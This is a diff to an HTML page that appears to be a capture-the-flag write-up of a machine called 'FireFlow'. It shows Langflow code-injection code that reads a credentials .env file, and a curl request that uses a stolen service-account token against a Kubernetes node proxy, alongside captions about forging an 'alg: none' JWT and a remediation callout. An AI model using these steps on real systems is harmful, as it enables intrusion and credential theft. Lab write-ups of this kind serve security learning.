@@ -142,17 +142,16 @@
     <p>The Langflow instance runs version 1.8.2. An unauthenticated Remote Code Execution vulnerability exists in the flow builder API. By replacing the <code>TextOperations</code> node code with a custom Python class running <code>subprocess.Popen</code>, we gain command execution.</p>
     <pre><code>import subprocess
 from lfx.custom import Component
-from lfx.io import MessageTextInput, Output
 from lfx.schema.message import Message
 
 class TextOperations(Component):
     def get_message(self) -> Message:
-        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE)
         out, _ = proc.communicate()
         return Message(text=out.decode("utf-8"))</code></pre>
     <figure>
-      <img src="../assets/fireflow_harness_exploit_run.webp" alt="Exploit Harness Run Log">
-      <figcaption>Running the exploit harness to verify remote code execution and gather credentials.</figcaption>
+      <img src="../assets/terminal_foothold.png" alt="Exploiting Langflow via CLI">
+      <figcaption>Running the python script to read environment variables and pivoting via SSH.</figcaption>
     </figure>
   </section>
 
@@ -176,6 +175,10 @@ Payload: {"iss": "kubernetes/serviceaccount", "sub": "system:serviceaccount:defa
 # Query Kubelet proxy logs
 curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
   "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/syslog" | head -n 30</code></pre>
+    <figure>
+      <img src="../assets/terminal_privesc.png" alt="Forging JWT and Querying Kubelet Proxy">
+      <figcaption>Forging an 'alg: none' JWT and exploiting proxy access to read host syslog.</figcaption>
+    </figure>
     <div class="callout"><span class="k">Closing FireFlow</span>
       <p>Upgrade Langflow to version 1.8.3 or above. Fix JWT authentication by strictly validating JWT algorithms (forbidding "none"). Limit service account privileges on the Kubelet proxy node endpoints.</p>
     </div>
